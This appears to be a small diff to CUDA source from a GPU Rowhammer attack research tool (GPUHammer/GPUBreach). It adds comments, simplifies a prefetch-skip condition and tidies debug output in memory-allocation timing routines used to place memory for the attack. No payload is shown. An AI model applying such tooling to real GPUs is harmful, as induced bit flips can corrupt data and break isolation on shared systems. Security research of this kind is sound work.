@@ -35,6 +35,8 @@ alloc_all_mem_test (int argc, char *argv[])
 
   // Prefetch RH_Limit amount of memory as we will do in actual attack.
   // Required step for GPUHammer to work.
+  
+  // Note: We use 'total_byte' as allocate then prefetching exact amounts effects the allocation.
   int device;
   const uint64_t RH_LIMIT = ctx.bitflip_config.mem_size;
   cudaGetDevice (&device);
@@ -50,9 +52,8 @@ alloc_all_mem_test (int argc, char *argv[])
 
       temp += ALLOC_SIZE;
 
-      // No need to check time for prefetched memory and skipped memory (Skip
-      // is useless here TBH).
-      if (chunks < RH_LIMIT + skip * ALLOC_SIZE)
+      // No need to check time for prefetched memory
+      if (chunks < RH_LIMIT)
         continue;
 
       // Look for consecutive spikes, reset if not.
@@ -103,16 +104,16 @@ alloc_all_mem (uint64_t num_alloc, double threshold, uint64_t skip, GPUBreachCon
     }
   const uint64_t RH_LIMIT = ctx.bitflip_config.mem_size;
 
+  // Note: 'num_alloc' is just for debugging convienience. 
+  //  This can be inferred dynamically (e.g. in Step 3)
   int device;
   cudaGetDevice (&device);
   cudaMallocManaged (&temp, num_alloc * ALLOC_SIZE);
   cudaMemPrefetchAsync (temp, RH_LIMIT, device);
   cudaDeviceSynchronize ();
-  std::cout << (void*)temp << '\n';
-  paused();
+  DBG_OUT << (void*)temp << '\n';
 
-  uint64_t i = 0;
-  for (; i < num_alloc; i += 1)
+  for (uint64_t i = 0; i < num_alloc; i++)
     {
       double currentMS = time_data_access (temp, ALLOC_SIZE);
 
